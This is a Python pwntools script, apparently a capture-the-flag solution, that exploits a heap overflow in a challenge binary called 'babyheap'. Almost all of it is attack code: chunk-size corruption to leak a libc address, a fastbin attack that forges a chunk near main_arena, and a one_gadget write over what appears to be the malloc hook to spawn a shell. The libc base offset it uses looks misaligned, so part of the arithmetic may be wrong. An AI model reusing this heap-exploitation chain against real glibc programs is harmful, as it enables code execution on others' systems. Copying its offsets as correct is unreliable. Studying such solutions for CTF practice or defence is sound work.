# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')
'''
漏洞：任意溢出
利用：
1、leaklibc两个指针指向同一位置（fastbin+unsortedbin）
2、fastbin attack

'''

p = process("./babyheap")
elf = ELF("./babyheap")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def allocate(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def fill(idx, size, content):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Content: ')
    p.send(content)

def free(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

def dump(idx):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(idx))

gdb.attach(p)
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x80)#4
free(2)
free(1)
payload = p64(0)*3 + p64(0x21) + "\x80"
fill(0,len(payload),payload)
payload = p64(0)*3 + p64(0x21)
fill(3,len(payload),payload)

allocate(0x10)#1
allocate(0x10)#2
allocate(0x80)#5
payload = p64(0)*3 + p64(0x91)
fill(3,len(payload),payload)
free(4)
dump(2)
p.recvuntil("\x0a",drop=True)
main_arena = u64(p.recv(6)+"\x00\x00")-0x58
log.success("main_arena: "+hex(main_arena))
libc_base = main_arena - 0x3C4B2D
allocate(0x60)#4
free(4)
payload = p64(0)*3 + p64(0x71) + p64(main_arena-0x33)
fill(3,len(payload),payload)

allocate(0x60)#4
allocate(0x60)#6

one_gadget = libc_base + 0x4526a
payload = "\x00"*0x13 + p64(one_gadget)
fill(6,len(payload),payload)
log.success("main_arena: "+hex(main_arena))
pause()
allocate(0x10)



p.interactive()

